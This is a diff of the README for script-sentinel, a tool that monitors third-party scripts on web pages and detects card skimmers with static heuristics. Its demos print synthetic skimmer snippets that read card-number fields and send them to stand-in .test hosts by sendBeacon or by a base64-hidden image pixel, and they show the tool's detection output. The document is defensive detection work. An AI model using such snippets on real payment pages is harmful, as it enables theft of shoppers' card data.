@@ -12,15 +12,19 @@ code runs on your checkout page with your users' trust. script-sentinel keeps an
 every script your pages load, pins what each one should look like, and tells you when one
 changes and whether the change looks like a skimmer.
 
-> **Status: in active development (day 5 of 14).** Scans fetch your pages, inventory every
+> **Status: in active development (day 6 of 14).** Scans fetch your pages, inventory every
 > script they load, download and hash every script body, keep a version history per script,
 > check `integrity` attributes the way a browser does, and snapshot each page's security
 > headers. Every script is approved (with a written justification), rejected or pending,
 > by hand or through origin, prefix and hash policies, and a vendor change sends a pinned
 > script back to review. Each scan compares every script with what it served last time:
 > new scripts and changed bodies become findings with a severity and a JS-aware token
-> diff that names the hosts the new code talks to. Decisions, status changes and the
-> handling of findings land in a hash-chained audit trail. See [docs/PLAN.md](docs/PLAN.md)
+> diff that names the hosts the new code talks to. Skimmer heuristics read what the code
+> does (card fields read and sent to another host, wallet-address swaps, obfuscation,
+> injected scripts), see through `atob` and string-joining, and raise the severity; a
+> skimmer already running when monitoring starts is reported instead of becoming the
+> baseline. Decisions, status changes and the handling of findings land in a hash-chained
+> audit trail. See [docs/PLAN.md](docs/PLAN.md)
 > for the roadmap and [docs/PROGRESS.md](docs/PROGRESS.md) for the daily log.
 
 ## Why
@@ -50,7 +54,7 @@ changes and whether the change looks like a skimmer.
 | Audit trail | Every decision, policy change and status change, append-only and SHA-256 hash-chained per site, with a verifier that finds the first edited, removed or reordered event | ✅ day 4 |
 | Change review | Every scan compares each script with what it served last time; a changed body (including going back to an old one) or a script new to an already-scanned page becomes a finding with a severity: a token diff that ignores comments and whitespace and stays fast on minified bundles, size and entropy deltas, and the hosts and URLs the new code references; inline blocks are matched by content, so inserting one doesn't shift the others | ✅ day 5 |
 | Findings | Open, acknowledged or resolved (with a note), each step in the audit trail; `scan run --fail-on SEVERITY` gates a pipeline; `scripts diff` compares any two versions | ✅ day 5 |
-| Skimmer heuristics | New exfiltration sinks, card-field listeners, wallet-address swaps, obfuscation, script injection | day 6 |
+| Skimmer heuristics | Exfiltration sinks (`sendBeacon`, `fetch`, XHR, image pixels, WebSockets, `$.ajax`) and where they send, card-field and form-input collection, cookies and storage, wallet addresses and clipboard swaps, `eval` on decoded text, packers and `_0x` names, injected scripts; literals decoded (`atob`, `fromCharCode`, reversed strings) and joined before the rules run, so hidden hosts count. Verdicts combine signals and only count what a change added; a page's first scan reports a skimmer instead of baselining it; `sentinel inspect FILE` runs offline. Tested on a synthetic corpus of skimmers and benign look-alikes | ✅ day 6 |
 | CSP reports | `report-uri` and Reporting API collector with dedupe, rate limits, batch ingest and optional Kafka | days 7–8 |
 | CSP builder | Policy suggestions from the approved inventory and observed reports | day 9 |
 | Worker and alerts | Scheduled scans, advisory locks, transactional outbox, HMAC-signed webhooks | day 10 |
@@ -73,7 +77,7 @@ flowchart LR
     scanner --> diff["Change detection<br/>token diff · hosts · severity"]
     diff --> findings["Findings"] --> outbox["Outbox<br/>(day 10)"] --> hooks["Signed webhooks"]
     findings --> trail
-    heur["Skimmer heuristics<br/>(day 6)"] -.-> diff
+    heur["Skimmer heuristics<br/>sinks · collection · wallets<br/>obfuscation · injection"] --> diff
     sites --> store
     csp --> ingest["Buffered ingest<br/>(memory or Kafka)"] --> store
 ```
@@ -273,8 +277,19 @@ Design notes:
   didn't finish that one within 100 s.
 - **New hosts, not just new code.** URLs in string and template literals are extracted
   (escapes like `\/` and `\x2f` undone, protocol-relative `//host` included), and a body
-  that references a host its previous version didn't is `high` severity. URLs built at
-  runtime are the skimmer heuristics' job (day 6).
+  that references a host its previous version didn't is `high` severity. Hosts the code
+  hides (decoded with `atob` or `fromCharCode`, reversed, or joined from pieces) count as
+  referenced hosts too.
+- **Skimmer heuristics read the code the way a reviewer would.** Before the rules run, the
+  token stream is partly evaluated: decoding calls on literals are replaced by their
+  result, adjacent literals joined with `+` are folded, `obj["name"]` becomes `obj.name`,
+  and `name = <URL>` assignments are remembered so `fetch(name)` knows where it goes. The
+  rules then emit counted signals with evidence, and verdicts combine them: a single
+  `fetch` or a card-field selector is everyday code, card fields plus a send to a host that
+  is neither the script's nor the site's is `high`. Given the previous body, a verdict
+  needs a new or more frequent signal, so a payment library that always posted card data
+  to its own API stays quiet when it ships a fix. It is static analysis: it can be evaded,
+  and a verdict says where to look, next to the diff; it never approves anything.
 - **Inline identity follows content.** Inline blocks are matched against the page's known
   blocks by exact body, normalized body, token similarity (at least 0.6) and only then by
   position, so a new snippet in front of the others is one new script instead of every
@@ -493,22 +508,22 @@ document.addEventListener("change", function (e) {
 });
 ```
 
-The finding says what changed, where it runs and why it is `critical`, and shows the
-tokens that were added:
+The finding says what changed, where it runs and why it is `critical`, shows the tokens
+that were added, and what the skimmer heuristics make of them:
 
 ```console
 $ cat skim.js >> examples/fixture-cdn/analytics/v2/tag.js    # the vendor is compromised
 $ uv run sentinel scan run demo --fail-on high
 …
 findings: 1 (review with: sentinel findings show ID)
-  CRITICAL ee5833e7-145d-4ddd-8ba7-a784583d2029  Script changed: http://127.0.0.1:8001/analytics/v2/tag.js
-           the code changed; references new hosts: collect.example-cdn.test; runs on a payment page
+  CRITICAL 6cb54982-7705-470b-b79d-000a75ad29a9  Script changed: http://127.0.0.1:8001/analytics/v2/tag.js
+           the code changed; references new hosts: collect.example-cdn.test; reads payment card fields (cardnumber) and sends data to collect.example-cdn.test; watches form input (change) and sends data to collect.example-cdn.test; runs on a payment page
 $ echo $?
 5
-$ uv run sentinel findings show ee5833e7-145d-4ddd-8ba7-a784583d2029
-finding ee5833e7-145d-4ddd-8ba7-a784583d2029 (demo): script.changed, open
+$ uv run sentinel findings show 6cb54982-7705-470b-b79d-000a75ad29a9
+finding 6cb54982-7705-470b-b79d-000a75ad29a9 (demo): script.changed, open
   CRITICAL Script changed: http://127.0.0.1:8001/analytics/v2/tag.js
-           the code changed; references new hosts: collect.example-cdn.test; runs on a payment page
+           the code changed; references new hosts: collect.example-cdn.test; reads payment card fields (cardnumber) and sends data to collect.example-cdn.test; watches form input (change) and sends data to collect.example-cdn.test; runs on a payment page
   pages [payment]: http://127.0.0.1:8000/checkout.html, http://127.0.0.1:8000/index.html
   size: 231 -> 400 bytes (+169)   entropy: 5.02 -> 5.02 bits/char (+0.00)
   tokens: -0 +37 of 56 -> 93 (similarity 75%)
@@ -519,10 +534,20 @@ finding ee5833e7-145d-4ddd-8ba7-a784583d2029 (demo): script.changed, open
 + document . addEventListener ( "change" , function ( e ) {
 + if ( e . target . name === "cardnumber" ) navigator . sendBeacon ( "https://collect.example-cdn.test/c" , e . target . value ) ;
 + } ) ;
+  verdicts:
+    HIGH     skimmer.card_data: reads payment card fields (cardnumber) and sends data to collect.example-cdn.test
+    HIGH     skimmer.form_data: watches form input (change) and sends data to collect.example-cdn.test
+  new signals (3):
+    collect.form_listener  change
+      addEventListener("change", function (e) { if (e.target.name === "cardnumber") navigator.sendBeacon("https://collect.ex …
+    collect.card_field  cardnumber
+      "cardnumber") navigator.sendBeacon("https://collect.example-cdn.test/c", e.target.value); });
+    exfil.beacon  collect.example-cdn.test  [literal]
+      sendBeacon("https://collect.example-cdn.test/c", e.target.value); });
 $ uv run sentinel scripts diff demo http://127.0.0.1:8001/analytics/v2/tag.js --from sha384-raygKpbL
 http://127.0.0.1:8001/analytics/v2/tag.js
-  from sha384-raygKpbLnYdKgM3/yZTB+rNJEmEUx75tgDCpLy3OMpv6OlnikQK3g4yXoPd2vFCD  (first seen 2026-11-25 10:30Z)
-  to   sha384-C9HItuTAqj2KTcNQcbdVkXaXTUx7KHGGC86Sxg8TlFAWrJYYGK9JNwE5f/abopwL  (first seen 2026-11-25 10:30Z)
+  from sha384-raygKpbLnYdKgM3/yZTB+rNJEmEUx75tgDCpLy3OMpv6OlnikQK3g4yXoPd2vFCD  (first seen 2026-11-26 10:18Z)
+  to   sha384-C9HItuTAqj2KTcNQcbdVkXaXTUx7KHGGC86Sxg8TlFAWrJYYGK9JNwE5f/abopwL  (first seen 2026-11-26 10:18Z)
   size: 209 -> 400 bytes (+191)   entropy: 4.99 -> 5.02 bits/char (+0.03)
   tokens: -0 +46 of 47 -> 93 (similarity 67%)
   new hosts: collect.example-cdn.test
@@ -533,33 +558,42 @@ http://127.0.0.1:8001/analytics/v2/tag.js
 + document . addEventListener ( "change" , function ( e ) {
 + if ( e . target . name === "cardnumber" ) navigator . sendBeacon ( "https://collect.example-cdn.test/c" , e . target . value ) ;
 + } ) ;
-$ uv run sentinel findings ack ee5833e7-145d-4ddd-8ba7-a784583d2029
-finding ee5833e7-145d-4ddd-8ba7-a784583d2029 is now acknowledged
-$ uv run sentinel findings resolve ee5833e7-145d-4ddd-8ba7-a784583d2029
+  verdicts:
+    HIGH     skimmer.card_data: reads payment card fields (cardnumber) and sends data to collect.example-cdn.test
+    HIGH     skimmer.form_data: watches form input (change) and sends data to collect.example-cdn.test
+  new signals (3):
+    collect.form_listener  change
+      addEventListener("change", function (e) { if (e.target.name === "cardnumber") navigator.sendBeacon("https://collect.ex …
+    collect.card_field  cardnumber
+      "cardnumber") navigator.sendBeacon("https://collect.example-cdn.test/c", e.target.value); });
+    exfil.beacon  collect.example-cdn.test  [literal]
+      sendBeacon("https://collect.example-cdn.test/c", e.target.value); });
+$ uv run sentinel findings ack 6cb54982-7705-470b-b79d-000a75ad29a9
+finding 6cb54982-7705-470b-b79d-000a75ad29a9 is now acknowledged
+$ uv run sentinel findings resolve 6cb54982-7705-470b-b79d-000a75ad29a9
 error: resolving a finding needs a note saying what was done
-$ uv run sentinel findings resolve ee5833e7-145d-4ddd-8ba7-a784583d2029 -n "Vendor compromise: tag removed from checkout, vendor notified"
-finding ee5833e7-145d-4ddd-8ba7-a784583d2029 is now resolved
-$ uv run sentinel findings list demo
-2026-11-25 10:30:23Z  resolved     ee5833e7-145d-4ddd-8ba7-a784583d2029
+$ uv run sentinel findings resolve 6cb54982-7705-470b-b79d-000a75ad29a9 -n "Vendor compromise: tag removed from checkout, vendor notified"
+finding 6cb54982-7705-470b-b79d-000a75ad29a9 is now resolved
+$ uv run sentinel findings list demo --min-severity high
+2026-11-26 10:18:56Z  resolved     6cb54982-7705-470b-b79d-000a75ad29a9
   CRITICAL Script changed: http://127.0.0.1:8001/analytics/v2/tag.js
-           the code changed; references new hosts: collect.example-cdn.test; runs on a payment page
-2026-11-25 10:30:19Z  open         0fa6fe9a-2b42-4920-886b-1ebf64448621
-  MEDIUM   Script changed: http://127.0.0.1:8001/analytics/v2/tag.js
-           the code changed; runs on a payment page
+           the code changed; references new hosts: collect.example-cdn.test; reads payment card fields (cardnumber) and sends data to collect.example-cdn.test; watches form input (change) and sends data to collect.example-cdn.test; runs on a payment page
 $ uv run sentinel audit list demo --limit 2
-#19   2026-11-25 10:30:26Z  finding.resolved      zeeshan          acknowledged -> resolved http://127.0.0.1:8001/analytics/v2/tag.js
+#19   2026-11-26 10:19:00Z  finding.resolved      zeeshan          acknowledged -> resolved http://127.0.0.1:8001/analytics/v2/tag.js
       Vendor compromise: tag removed from checkout, vendor notified
-#18   2026-11-25 10:30:25Z  finding.acknowledged  zeeshan          open -> acknowledged  http://127.0.0.1:8001/analytics/v2/tag.js
+#18   2026-11-26 10:18:59Z  finding.acknowledged  zeeshan          open -> acknowledged  http://127.0.0.1:8001/analytics/v2/tag.js
 ```
 
 The diff works on JavaScript tokens, so a 300 KB one-line bundle diffs down to the tokens
 that changed, and comment or whitespace-only rebuilds are reported as `script.reformatted`
 (`info`) rather than changes. Severity starts at `low` for a code change, goes to `medium`
 when the script grows by more than half or its entropy jumps (packing and obfuscation do
-both), to `high` when it references a host the previous body didn't, and one level up on a
-payment page. `--fail-on high` exits 5 when the scan raised anything that severe; it wins
-over `--fail-on-unauthorized` (4) and an incomplete scan (3). Resolving a finding needs a
-note, and every step lands in the audit trail next to the authorization events.
+both), to `high` when it references a host the previous body didn't, up to the severity of
+any skimmer verdict on what the new code does (reading card fields and sending data to
+another host is `high`), and one level up on a payment page. `--fail-on high` exits 5 when
+the scan raised anything that severe; it wins over `--fail-on-unauthorized` (4) and an
+incomplete scan (3). Resolving a finding needs a note, and every step lands in the audit
+trail next to the authorization events.
 
 Inline scripts have no URL, so they are identified by page and position. To keep that
 stable, a scan first matches each inline block with the page's known blocks by exact body,
@@ -587,6 +621,114 @@ A script that appears on a page an earlier scan already inventoried is a finding
 inline, `medium` external, `high` from a host no other script of the site uses, one level
 up on a payment page). A page's first successful scan is its baseline, so registering a
 new page doesn't flood the findings.
+
+### Skimmer heuristics
+
+Change review says *that* a script changed; the heuristics say what the code *does*. They
+look for exfiltration sinks (`navigator.sendBeacon`, `fetch`, `XMLHttpRequest`, image
+pixels, WebSockets, jQuery's `$.ajax`) and where each one sends, payment card fields and
+listeners on form input, cookies and web storage, hard-coded wallet addresses, patterns
+that match them and clipboard access, `eval` and `new Function` (worst on decoded text),
+packers, obfuscator-style `_0x` names, and scripts injected with `createElement`,
+`document.write` or `import()`. Before the rules run, `atob("…")`,
+`String.fromCharCode(…)`, reversed strings and `"a" + "b"` on literals are evaluated, so a
+host hidden that way is still a host. Signals are combined into verdicts, which is where
+the weight is: card fields plus a send to a host that is neither the script's own nor the
+site's is `high`, a wallet address together with the clipboard is `high`, a lone `fetch`
+is nothing.
+
+A page's first scan is normally its baseline. A script that already looks like a skimmer
+then is reported as `script.suspicious` instead of quietly becoming part of it. Here a
+promo page that is already compromised is added to monitoring:
+
+```html
+<script>
+document.addEventListener("submit", function () {
+  var v = document.querySelector("#cc-number").value;
+  new Image().src = atob("aHR0cHM6Ly9weC5za2ltLnRlc3QvZw==") + "?v=" + v;
+});
+</script>
+```
+
+```console
+$ uv run sentinel pages add demo http://127.0.0.1:8000/promo.html --payment
+added page http://127.0.0.1:8000/promo.html (payment page)
+$ uv run sentinel scan run demo --fail-on high
+…
+warning: payment pages run 2 scripts that are not approved (PCI DSS 6.4.3); review them with: sentinel scripts list demo
+findings: 1 (review with: sentinel findings show ID)
+  CRITICAL e109ba49-777e-4d1a-8e89-bf3fc9f67d4b  Suspicious script on a payment page: http://127.0.0.1:8000/promo.html#inline-1
+           found on the page's first scan; sends data to a host it hides: px.skim.test; reads payment card fields (cc-number) and sends data to px.skim.test; watches form input (submit) and sends data to px.skim.test; is obfuscated: sensitive text hidden by encoding; runs on a payment page
+$ echo $?
+5
+$ uv run sentinel findings show e109ba49-777e-4d1a-8e89-bf3fc9f67d4b
+finding e109ba49-777e-4d1a-8e89-bf3fc9f67d4b (demo): script.suspicious, open
+  CRITICAL Suspicious script on a payment page: http://127.0.0.1:8000/promo.html#inline-1
+           found on the page's first scan; sends data to a host it hides: px.skim.test; reads payment card fields (cc-number) and sends data to px.skim.test; watches form input (submit) and sends data to px.skim.test; is obfuscated: sensitive text hidden by encoding; runs on a payment page
+  pages [payment]: http://127.0.0.1:8000/promo.html
+  verdicts:
+    HIGH     exfil.hidden_destination: sends data to a host it hides: px.skim.test
+    HIGH     skimmer.card_data: reads payment card fields (cc-number) and sends data to px.skim.test
+    HIGH     skimmer.form_data: watches form input (submit) and sends data to px.skim.test
+    MEDIUM   obfuscation.packed: is obfuscated: sensitive text hidden by encoding
+  signals (5):
+    collect.form_listener  submit
+      addEventListener("submit", function () { var v = document.querySelector("#cc-number").value; new Image().src = atob( …
+    collect.card_field  cc-number
+      "#cc-number").value; new Image().src = atob("aHR0cHM6Ly9weC5za2ltLnRlc3QvZw==") + "?v=" + v; });
+    exfil.image  px.skim.test  [hidden]
+      Image().src = atob("aHR0cHM6Ly9weC5za2ltLnRlc3QvZw==") + "?v=" + v; });
+    obfuscation.encoded  base64
+      atob("aHR0cHM6Ly9weC5za2ltLnRlc3QvZw==") + "?v="
+    url.hidden  px.skim.test  [hidden]
+      atob("aHR0cHM6Ly9weC5za2ltLnRlc3QvZw==") + "?v="
+$ uv run sentinel scripts inspect demo 'http://127.0.0.1:8000/promo.html#inline-1'
+http://127.0.0.1:8000/promo.html#inline-1
+  version sha384-9DPh2U7gpZsOCDmO1/xj8Zj/tytZhK5OC5nAWgLUGts2wIsS60geQRQrIuZA98J3  (first seen 2026-11-26 10:19Z)
+  its own hosts: 127.0.0.1
+  verdicts:
+  …  (the same verdicts and signals as above)
+  hidden hosts: px.skim.test
+```
+
+`sentinel scripts inspect` runs the heuristics on any stored version (`--version` takes an
+id, SHA-384 or SRI prefix) without recording anything. `sentinel inspect FILE` needs no
+database at all: use it on a vendor script before approving it, or on your own bundles in
+CI. "Its own" hosts matter, so pass them: the same payment library is a skimmer when it
+posts card fields to a host nobody vouched for, and fine when that host is the one it's
+served from:
+
+```console
+$ uv run sentinel inspect tests/fixtures/heuristics/benign/psp_elements.js --fail-on high
+tests/fixtures/heuristics/benign/psp_elements.js
+  verdicts:
+    HIGH     skimmer.card_data: reads payment card fields (cc-csc, cc-number) and sends data to pay.vendor.test
+  signals (3):
+    collect.card_field  cc-number
+      "[autocomplete=cc-number]").value; var cvc = form.querySelector("[autocomplete=cc-csc]").value; return fetch("ht …
+    collect.card_field  cc-csc
+      "[autocomplete=cc-csc]").value; return fetch("https://pay.vendor.test/v1/tokens", { method: "POST", body …
+    exfil.fetch  pay.vendor.test  [literal]
+      fetch("https://pay.vendor.test/v1/tokens", { method: "POST", body: JSON.stringify({ number: pan, cvc: cvc }) …
+$ echo $?
+5
+$ uv run sentinel inspect tests/fixtures/heuristics/benign/psp_elements.js \
+    --script-host pay.vendor.test --fail-on high
+tests/fixtures/heuristics/benign/psp_elements.js
+  verdicts: none
+  …
+$ echo $?
+0
+```
+
+[`tests/fixtures/heuristics/`](tests/fixtures/heuristics) holds the synthetic corpus the
+rules are tested against: 13 skimmer-shaped samples (card and form exfiltration over
+beacons, pixels, XHR, WebSockets and jQuery, hosts hidden with base64, char codes and
+string joining, wallet swaps, `eval(atob(…))`, a packer, a hidden loader) and 7 benign
+look-alikes (an analytics tag, a PSP library, a tag manager, first-party checkout code,
+client-side card validation, a bundle, a separate collection host). Each declares the
+exact verdicts it must get. All of them are inert, and every host is on the reserved
+`.test` TLD.
 
 (Output from a real run against PostgreSQL 16.)
 
@@ -671,11 +813,12 @@ $ curl -s localhost:8080/v1/sites/demo/audit/verify | jq .
 | `GET` | `/v1/sites/{name}/audit?script_id=…&limit=100` | The audit trail, newest first |
 | `GET` | `/v1/sites/{name}/audit/verify` | Recompute the hash chain: `ok`, events verified, head hash, first bad event |
 | `GET` | `/v1/sites/{name}/findings?status=…&min_severity=…&scan_id=…&script_id=…&limit=50` | Findings, newest first |
-| `GET` | `/v1/findings/{id}` | One finding with its evidence (reasons, pages, diff hunks, size and entropy, new hosts and URLs) |
+| `GET` | `/v1/findings/{id}` | One finding with its evidence (reasons, pages, diff hunks, size and entropy, new hosts and URLs, the heuristics' signals and verdicts) |
 | `POST` | `/v1/findings/{id}/acknowledge` | Acknowledge (`actor`, optional `note`); audited |
 | `POST` | `/v1/findings/{id}/resolve` | Resolve (`actor`, `note` required); audited |
 | `POST` | `/v1/findings/{id}/reopen` | Reopen (`actor`, optional `note`); audited |
-| `GET` | `/v1/sites/{name}/scripts/{id}/diff?from=…&to=…&max_hunks=200` | Token diff between two versions (id, hex SHA-384 prefix or SRI prefix); defaults to the latest two |
+| `GET` | `/v1/sites/{name}/scripts/{id}/diff?from=…&to=…&max_hunks=200` | Token diff between two versions (id, hex SHA-384 prefix or SRI prefix), with the signals the newer one added and the verdicts on them; defaults to the latest two |
+| `GET` | `/v1/sites/{name}/scripts/{id}/inspect?version=…` | Run the skimmer heuristics on a version (default: the latest): signals with evidence, hidden hosts, verdicts and the worst severity; read-only |
 
 `PATCH /v1/sites/{name}` also accepts `respect_robots`. The `actor` on authorization and
 finding requests is recorded as given: the API has no authentication yet (day 13 adds it),
@@ -724,7 +867,10 @@ that it is recorded as a new version of the same script, sent back to review, fa
 gate and leaves an intact audit trail. Then it plants a synthetic skimmer in the vendor
 script and checks for a `critical` finding with the new host in its diff, exit code 5 from
 `--fail-on high`, the audited ack/resolve flow, and that an inline block inserted in front
-of the others is one new script.
+of the others is one new script. Finally it adds a page that already runs a skimmer and
+checks for a `script.suspicious` finding with the hidden host, and runs `sentinel inspect`
+on the heuristics corpus (a skimmer fails `--fail-on high`, the PSP library given its own
+host passes).
 
 ## Project layout
 
@@ -748,6 +894,7 @@ src/script_sentinel/
   diff.py           token diff (difflib for small changes, budgeted patience diff for big ones)
   changes.py        change analysis (size, entropy, referenced hosts), severity rules,
                     inline block matching
+  heuristics.py     skimmer heuristics: partial evaluation, signals, verdicts
   findings.py       raising findings after a scan; acknowledge, resolve, reopen
   scanner.py        runs a scan and records snapshots, fetches, versions and the inventory
   authorization.py  decisions, policies and the rules that derive each script's status
@@ -757,6 +904,7 @@ examples/
   fixture-site/     synthetic shop for the quick start and CI
   fixture-cdn/      the "third-party" scripts it loads
 tests/              pytest suite (SQLite always, PostgreSQL when configured)
+  fixtures/heuristics/  synthetic skimmer and benign corpus with expected verdicts
 docs/               PLAN.md and PROGRESS.md
 ```
 
